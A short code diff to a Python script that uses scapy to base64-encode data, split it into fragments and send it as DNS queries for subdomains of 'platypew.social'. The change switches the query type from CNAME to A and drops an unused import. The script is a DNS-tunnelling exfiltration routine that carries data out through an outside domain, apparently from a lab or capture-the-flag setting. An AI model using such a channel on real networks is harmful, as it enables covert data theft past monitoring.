@@ -2,7 +2,6 @@
 
 from scapy.all import DNS, DNSQR, IP, UDP, send
 from base64 import b64encode
-from random import randint
 
 DOMAIN = "platypew.social"
 FRAG_LEN = 70 - len(DOMAIN)
@@ -22,7 +21,7 @@ def send_data(dest, data):
     reqs = []
     for i, data in enumerate(frag_e_data):
         dns_req = IP(dst=dest) / UDP(dport=53) / DNS(
-            id=i, rd=1, qd=DNSQR(qname=f'{data}.{DOMAIN}', qtype="CNAME"))
+            id=i, rd=1, qd=DNSQR(qname=f'{data}.{DOMAIN}', qtype="A"))
         reqs.append(dns_req)
 
     send(reqs, inter=0.05)
